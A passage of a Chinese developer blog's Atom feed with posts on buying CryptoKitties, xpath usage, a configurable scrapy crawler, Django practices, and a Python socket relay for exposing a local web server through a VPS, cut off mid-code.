挑选自己心仪的猫，具体怎么挑，什么样的属性有价值，这边就不多介绍了。</li><li>选择完点击 BUY NOW, 最后会出现下图的弹窗，GAS LIMIT 是指让节点执行多少次指令（因为以太网开发的智能合约是图灵完备的，所以有可能陷入死循环，所以需要指定运行多少次后停止）， GAS PRICE 指的是你愿意为本次交易的一个单位 gas 愿意支付的手续费, 1 wei = 1/10^18 eth</li></ol><p><img src="/media/15128871715300.jpg" alt=""></p><ol><li>点击 BUY EHTER 即可完成支付，然后只需等待，只要最终全网确认完成，你就有自己的猫啦！</li></ol><p><img src="/media/15128877725672.jpg" alt=""></p><h4 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h4><p>最后希望大家以平常心看待这个游戏;-)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15128794800292.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。&lt;/p&gt;
&lt;p&gt;下面介绍一下我使用的方法&lt;br&gt;
    
    </summary>
    
    
      <category term="以太坊" scheme="https://facert.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
  </entry>
  
  <entry>
    <title>xpath 使用教程</title>
    <link href="https://facert.github.io/2017/12/03/xpath-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/03/xpath-使用教程/</id>
    <published>2017-12-03T13:26:31.000Z</published>
    <updated>2017-12-03T14:06:15.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">   &lt;span&gt;</span><br><span class="line">   &lt;/span&gt;</span><br><span class="line">   &lt;ul&gt;</span><br><span class="line">       &lt;li class=&quot;item-0&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-0&quot;&gt;link0-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-1&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-1&quot;&gt;link1-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-2&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-2&quot;&gt;link2-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">   &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这篇文章列举常用的一些 xpath 用法，以便同学们更好的理解使用 <a href="http://www.anycrawl.info/" target="_blank" rel="noopener">http://www.anycrawl.info/</a> 这个网站</p><ol><li><code>//div</code> (获取所有 div 元素，不管在文档什么位置)</li><li><code>/div</code> (获取根路径 div 元素)</li><li><code>//div/span</code> (获取 div 元素下一级的 span 元素)</li><li><code>//div//span</code> (获取 div 元素所有后代的 span)</li><li><code>//ul/li[1]</code> (获取 ul 子元素下的第一个 li 元素)</li><li><code>//ul/li[last()]</code> (获取 ul 子元素下的最后一个 li 元素)</li><li><code>//div[@class=&quot;demo&quot;]</code> (获取 class 为 demo 的 div 元素)</li><li><code>//ul/li/a/@href</code> (获取 ul&gt;li&gt;a 链接的 href 属性)</li><li><code>//ul/li/a/text()</code> (获取 ul&gt;li&gt;a 链接的内容)</li><li><code>//*[@class=&quot;item-0&quot;]</code> (获取 class 为 item-0 的元素)</li><li><code>//*[contains(@class, &quot;de&quot;)]</code> (获取 class 元素包含 de 的元素)</li></ol><h4 id="参考手册：xpath-cheatsheet"><a href="#参考手册：xpath-cheatsheet" class="headerlink" title="参考手册：xpath cheatsheet "></a>参考手册：<a href="http://www.cheat-sheets.org/saved-copy/Locators_table_1_0_2.pdf" target="_blank" rel="noopener">xpath cheatsheet </a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>动态可配置化 Python 爬虫教程</title>
    <link href="https://facert.github.io/2017/12/03/%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E7%BD%AE%E5%8C%96%20Python%20%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/12/03/动态可配置化 Python 爬虫教程/</id>
    <published>2017-12-03T10:48:21.000Z</published>
    <updated>2018-01-27T14:47:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 <a href="http://www.anycrawl.info" target="_blank" rel="noopener">http://www.anycrawl.info</a> ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。</p><p>我举 <a href="http://www.anycrawl.info/project/15/" target="_blank" rel="noopener">http://www.anycrawl.info/project/15/</a> 豆瓣小组爬虫的例子来介绍下网站的使用方法。<br><a id="more"></a></p><h4 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 需求"></a>0x00 需求</h4><p><img src="/media/15123009061075.jpg" alt=""><br><img src="/media/15123009205239.jpg" alt=""></p><p>我们希望能够爬取害羞组下的所有话题的标题，作者，以及对应的内容和图片</p><h4 id="0x01-基础配置"><a href="#0x01-基础配置" class="headerlink" title="0x01 基础配置"></a>0x01 基础配置</h4><p>基础配置主要是 scrapy 的 settings.py 的一些选项</p><p><img src="/media/15122997289231.jpg" alt=""></p><ol><li>项目名，别名不说了，域名指的是 allowed_domains，也就是允许爬虫在哪些域名下爬取</li><li>爬虫开始的链接指的是 start_urls，指的是爬虫从哪个链接开始爬取，比如，<a href="https://www.douban.com/group/haixiuzu/discussion" target="_blank" rel="noopener">https://www.douban.com/group/haixiuzu/discussion</a> ， 从豆瓣害羞组的第一页爬取。</li><li><p>保存数据的方式，目前支持 json, csv, image, mongodb, elasticsearch。(如果选择 image 的方式，则需要在下面配置规则的时候，选择保存图片链接 到 image_urls 这个字段，scrapy 会自动下载图片。mongodb, elasticsearch 则需要自己在 settings.py 配置你的 host 和 port)</p><p>我们配置如下<br><img src="/media/15123038498788.jpg" alt=""></p></li></ol><h4 id="0x02-规则列表"><a href="#0x02-规则列表" class="headerlink" title="0x02 规则列表"></a>0x02 规则列表</h4><p><img src="/media/15123004064954.jpg" alt=""></p><ol><li>规则列表分成两部分，链接正则 和 xpath 规则，必须先配置链接正则，链接正则对应的概念是 scrapy 的 Rule 的概念，意思是根据你给定的链接正则去匹配，如果匹配的到，则执行回调函数 callback, callback 可以为空，如果为空，则放入队列中。</li></ol><p><img src="/media/15123005270324.jpg" alt=""></p><p>如上面 <code>/group/\w+/discussion\?start=[0-9]{0,4}$</code> 这个对应的是小组分页的链接正则，遇到这些链接，只要丢到队列中，由 scrapy 下次处理，<code>/group/topic/\d+/</code> 这个对应的是话题的详情链接，遇到这些，则执行 parse_topic 函数，那么这个函数具体执行什么内容，这就看下面配置的 xpath 规则，<a href="https://zhuanlan.zhihu.com/p/31659319" target="_blank" rel="noopener">xpath 教程</a> ，如我们需要 title, author, description, create_time, image_urls 这几个字段，直接配置即可，只要能通过 xpath 语法找到。</p><p>配置完成后，会对应生成如下的源码：</p><p><img src="/media/15123045039778.jpg" alt=""></p><h4 id="0x03-爬取状态"><a href="#0x03-爬取状态" class="headerlink" title="0x03 爬取状态"></a>0x03 爬取状态</h4><p>点击提交后，就跳转到下载页面</p><p><img src="/media/15123045808565.jpg" alt=""></p><p>这里面有个数据指标的功能，记录你爬取的数目，目前看起来有点鸡肋，如果不需要记录，将 settings 里面的 COUNT_DATA 改为 False 就行。</p><h4 id="0x04-运行爬虫"><a href="#0x04-运行爬虫" class="headerlink" title="0x04 运行爬虫"></a>0x04 运行爬虫</h4><p>运行爬虫必须有 python 和 scrapy 环境，安装 python 和 pip 这里不介绍了，安装 scrapy 命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>然后下载刚才的项目代码，解压后，进入 output/xxxxxx 目录，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python scripts.py</span><br></pre></td></tr></table></figure><p>或者直接用 scrapy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;项目名&gt;</span><br></pre></td></tr></table></figure><h4 id="0x05-Todo"><a href="#0x05-Todo" class="headerlink" title="0x05 Todo"></a>0x05 Todo</h4><ol><li>支持自动登录</li><li>支持动态爬取</li><li>api 接口爬虫</li><li>能适配更多爬取场景</li><li>支持 css 解析网页</li><li>其他</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 &lt;a href=&quot;http://www.anycrawl.info&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info&lt;/a&gt; ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。&lt;/p&gt;
&lt;p&gt;我举 &lt;a href=&quot;http://www.anycrawl.info/project/15/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info/project/15/&lt;/a&gt; 豆瓣小组爬虫的例子来介绍下网站的使用方法。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>谈谈 django 应用实践</title>
    <link href="https://facert.github.io/2017/10/11/%E8%B0%88%E8%B0%88-django-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    <id>https://facert.github.io/2017/10/11/谈谈-django-应用实践/</id>
    <published>2017-10-11T15:56:33.000Z</published>
    <updated>2018-01-27T14:47:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。</p><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p><img src="/media/15077390149599.png" alt=""></p><a id="more"></a><p>首先我们得了解下 django 这个框架整体的处理流程，假设我们采用 nginx + uwsgi + django 的 web server 模式</p><ol><li>一个请求过来后，首先经过 nginx 做反向代理，将请求转发到 uwsgi (python 用 wsgi 这种协议来解析 http 请求，uwsgi 是一个 解析 wsgi 的应用)，uwsgi 再将解析过的数据传到 django。</li><li>django 收到请求后，首先会经过一组全局的中间件 (middleware)，调用 process_request 作为预处理，比如解析用户状态，检验 csrf_token (post 请求)，如果有问题，则直接返回 response，不再调用 view 函数。否则，调用 process_view ，如果没问题进入 view 函数。</li><li>进入 view 函数后开发者可以写自己的逻辑，比如操作数据库，更新缓存，最后返回一个 response。</li><li>接下来 跳出 view 函数，重新进入 middleware，调用 process_response，对 response 做些最后的修饰，返回给用户。</li></ol><h3 id="views-模块"><a href="#views-模块" class="headerlink" title="views 模块"></a>views 模块</h3><ol><li>view 不仅可以用函数，也可以用通用视图类（generic_view），好处是：代码更加清晰，可以复用继承，并且结合 mixin 能够开发更加灵活的 view 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello_fn(request, name=&quot;World&quot;):</span><br><span class="line">        return HttpResponse(&quot;Hellp &#123;&#125;!&quot;.format(name))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class FeedMixin(object):</span><br><span class="line">        def get_context_data(self, **kwargs):</span><br><span class="line">            context = super().get_context_data(**kwargs)</span><br><span class="line">            context[&quot;feed&quot;] = models.Post.objects.viewable_posts(self.request.user)</span><br><span class="line">            return context</span><br><span class="line">            </span><br><span class="line">class MyFeed(FeedMixin, generic.CreateView):</span><br><span class="line">        model = models.Post</span><br><span class="line">        template_name = &quot;myfeed.html&quot;</span><br><span class="line">        success_url = reverse_lazy(&quot;my_feed&quot;)</span><br></pre></td></tr></table></figure><ol><li>python 的装饰器很好用，也可以用于 views 函数， 比如下面的装饰器用于登录用户的检测</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@login_required</span><br><span class="line">def simple_view(request):</span><br><span class="line">       return HttpResponse()</span><br></pre></td></tr></table></figure><h3 id="urls-模块"><a href="#urls-模块" class="headerlink" title="urls 模块"></a>urls 模块</h3><ol><li>urls.py 这个文件将访问的 url 跟 view 模块对应起来，按从上到下的顺序匹配</li><li>采用 include 函数可以包含其他 app 的 urls，namespace 参数定义后可以在模板中直接调用，比如 </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% url &apos;articles&apos;%&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&apos;^articles/$&apos;, include(articles.urls), namespace=&quot;articles&quot;),</span><br></pre></td></tr></table></figure><h3 id="models-模块"><a href="#models-模块" class="headerlink" title="models 模块"></a>models 模块</h3><ol><li>model 是具有处理数据库的一种面向对象的方法的类，能够让不熟悉数据库语句的程序员也能快速操作数据库</li><li>采用面向对象的方式创建类，加上 <code>abstract = True</code> 则为抽象类</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Postable(models.Model):</span><br><span class="line">    created = models.DateTimeField(auto_now_add=True)</span><br><span class="line">    modified = modified.DateTimeField(auto_now=True)</span><br><span class="line">    message = models.TextField(max_length=500)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        abstract = True</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">class Post(Postable):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Comment(Postable):</span><br><span class="line">   ···</span><br></pre></td></tr></table></figure><ol><li>django 表对应关系有一对一（OneToOneField），一对多 (ForeignKey)，多对多 (ManyToManyField)，其中 多对多的模式通过创建一个中间表来实现。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Book(models.Model):</span><br><span class="line">    place = models.OneToOneField(Place, primary_key=True)</span><br><span class="line">    pub=models.ForeignKey(Publisher)</span><br><span class="line">    authors=models.ManyToManyField(Author)</span><br></pre></td></tr></table></figure><p>上面的例子中间表包括 author_id 和 book_id </p><ol><li>django 的 signal 实现 hook 数据库写行为，比如，pre_save, post_save，pre_delete, post_delete，你也可以自定义 signal, hook 其他行为。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@receiver(post_save, sender=TransactionDetail, dispatch_uid=&quot;update_stock_count&quot;)</span><br><span class="line">def update_stock(sender, instance, **kwargs):</span><br><span class="line">     instance.product.stock -= instance.amount</span><br><span class="line">     instance.product.save()</span><br></pre></td></tr></table></figure><ol><li>Person.objects.all(), 这里面的 objects 其实是个 manager， 实现了 all, filter 等函数，可以自定义。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Person(models.Model):</span><br><span class="line">    #...</span><br><span class="line">    object = models.Manager()</span><br></pre></td></tr></table></figure><ol><li>django 的 queryset 是惰性的，只有在真正用的时候才会去数据库查询，并且查询一次后，会有缓存，当再次遍历这个 queryset 的时候，不会再去查询。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person_set = Person.objects.filter(first_name=&quot;Dave&quot;)</span><br></pre></td></tr></table></figure><ol><li><p>数据库第一次创建后，会有再次更新字段的需求。django 在 1.4 版本前并没有这个功能，得用第三方库 south 来更新，后来的版本 django 自带了 migration 功能，能够将最新的 model 版本和数据库的字段作对比，自动生成 migration 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations # 生成 migration 文件</span><br><span class="line">python manage.py migrate # 将更改应用到数据库</span><br></pre></td></tr></table></figure></li><li><p>orm 不能直接看到 raw sql 语句，可以通过如下语句查看 sql</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.db import connection</span><br><span class="line">connection.queries</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">9. 可以使用 django-debug-toolbar 插件查看慢查询，也能对对哪些页面载入较慢有个大致的了解。</span><br><span class="line"></span><br><span class="line">10. 在 orm 中使用 select_related() 减少查询数据库次数:，select_related() 会自动扩展外键关系</span><br></pre></td></tr></table></figure><p>class Province(models.Model):<br>    name = models.CharField(max_length=10)</p><p>class City(models.Model):<br>    name = models.CharField(max_length=5)<br>    province = models.ForeignKey(Province)</p><p>citys = City.objects.select_related().all()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">不过对于高并发的应用来说外键不是很推荐。</span><br><span class="line"></span><br><span class="line">### forms 模块</span><br><span class="line"></span><br><span class="line">1. 前端传上来一个表单的值，但是没法确认这些值是不是为空，是不是类型正确，这个时候当然可以自己一个个值判断，也可以采用 forms 模块去做验证，用过 django-rest-framework 的同学会知道和里面的 serializers 是同一个概念</span><br></pre></td></tr></table></figure><p>class PersonDetailsForm(forms.Form):<br>       name = forms.CharField(max_length=100)<br>       age = forms.IntegerField()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 如果你用的是模板渲染的方式，那么展示的时候更简单，表单能自动生成 html 的表单。</span><br></pre></td></tr></table></figure></p><blockquote><blockquote><blockquote><p>f = PersonDetailsForm()<br>print(f.as_p())</p><p></p><p><label for="id_name">Name:</label> <input id="id_name" maxlength="100" name="name" type="text"></p><p></p><p></p><p><label for="id_age">Age:</label> <input id="id_age" name="age" type="number"></p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### admin 模块</span><br><span class="line"></span><br><span class="line">1. admin 基本上开箱即用，如果需要定制的话，也能做一些组件的定制，不过这些东西得看文档去详细了解了。</span><br><span class="line"></span><br><span class="line">### commands 模块</span><br><span class="line">1. django 提供了后台脚本模块，可以自己集成 BaseCommand 类去自定义脚本</span><br></pre></td></tr></table></figure><p></p></blockquote></blockquote></blockquote><p>python mannage.py -h<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个命令就能看到所有的 commands 命令</span><br><span class="line"></span><br><span class="line">2. 如果不想用他的模块，又想引入 django 项目的一些模块，可以采用下面的方法解决</span><br></pre></td></tr></table></figure></p><p>os.environ.setdefault(“DJANGO_SETTINGS_MODULE”, “myproject.settings”)<br>django.setup()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### settings 模块</span><br><span class="line"></span><br><span class="line">1. 所有的 settings 默认值都在这里面能找到，https://github.com/django/django/blob/master/django/conf/global_settings.py</span><br><span class="line">2. 上线的时候记得把 DEBUG 改成 False, 然后加上 ALLOWED_HOSTS </span><br><span class="line">3. MEDIA_ROOT， MEDIA_URL， STATIC_ROOT， STATIC_URL 这几个之前经常搞混，其实可以分为两类，MEDIA_ROOT 指的是上传文件的目录，MEDIA_URL 指的是前缀名，http://example.com/media/， 其中的media 就是 MEDIA_URL， 同样，STATIC_ROOT 指的是静态文件的目录，一般放 css, js 之类，STATIC_URL 值得是前缀名，http://example.com/static/。</span><br><span class="line">4. 一般部署上线的时候，用 nginx 直接渲染静态文件</span><br></pre></td></tr></table></figure></p><pre><code>location /media  {    alias /root/example_project/public/media;}location /static {    alias /root/example_project/static;}</code></pre><p>```</p><h3 id="contrib-模块"><a href="#contrib-模块" class="headerlink" title="contrib 模块"></a>contrib 模块</h3><ol><li>这里面的模块是 django 自带的 apps，用的比较多的有 admin, auth, sessions</li><li>admin 模块其实就是 django 的后台</li><li>auth 模块就是用户模块，功能上比较齐全，基本上可以基于这个模块做扩展。</li><li>session 模块结合 auth ，用来做用户的登录状态，对于大型网站来说，session 的存储可能是个问题，django 也提供了不同的 backends，支持 db, cache, file 等存储方式。</li></ol><h3 id="middleware-模块"><a href="#middleware-模块" class="headerlink" title="middleware 模块"></a>middleware 模块</h3><ol><li>django 自带的 middlreware 对于普通网站的需求已经蛮完善了，比如 CsrfMiddleware ， HttpMiddleware。</li><li>如果有自己的需求，也可以自定义，比如记录详细 log 信息，LogMiddleware，还有跨域的 CorsMiddleware。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>网上有人说 django 只能做小网站，不支持大的并发，其实这个说法还是很片面的。django 自身只是一个框架，如果网站请求处理慢，很多情况下是自己写的逻辑没有优化。确认是 django 框架问题的话，django 虽然设计上略复杂，但是很多模块还是可以拆分去自定义的。最后实在不济，靠增加机器数量也能顶一阵。</li><li>django 的国际化模块做的很不错</li><li>setting 文件可分成 product, 和 dev 两份，根据开发环境和生产环境不同引入不同的 setting 文件。</li><li>django-celery 用来执行异步任务</li><li>django 的插件非常多，<a href="https://github.com/rosarior/awesome-django" target="_blank" rel="noopener">https://github.com/rosarior/awesome-django</a></li><li>其他想到的再更新。。。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。&lt;/p&gt;
&lt;h3 id=&quot;整体流程&quot;&gt;&lt;a href=&quot;#整体流程&quot; class=&quot;headerlink&quot; title=&quot;整体流程&quot;&gt;&lt;/a&gt;整体流程&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/15077390149599.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web, django" scheme="https://facert.github.io/tags/web-django/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(10)-内网穿透</title>
    <link href="https://facert.github.io/2017/08/26/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-10-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>https://facert.github.io/2017/08/26/由浅入深写代理-10-反向代理/</id>
    <published>2017-08-26T06:27:04.000Z</published>
    <updated>2018-01-27T14:47:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要介绍代理的一个常用的功能：内网穿透<br>很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。</p><p>有专门的软件做这件事，如 ngrok, frp。<br><a id="more"></a><br>介绍下原理<br>由于内网的机器有 NAT 或 防火墙什么的，外网 vps 是无法会直接连接的，所以想要通过 vps 来中转就需要内网先连接 vps，然后 vps 通过连接的套接字来转发数据。</p><p>贴下代码</p><p>client_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s_conn.connect((&quot;xx.xx.xx.xx&quot;, 2333))</span><br><span class="line"></span><br><span class="line">    client_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    client_conn.connect((&apos;127.0.0.1&apos;, 8000))</span><br><span class="line"></span><br><span class="line">    handle_tcp(s_conn, 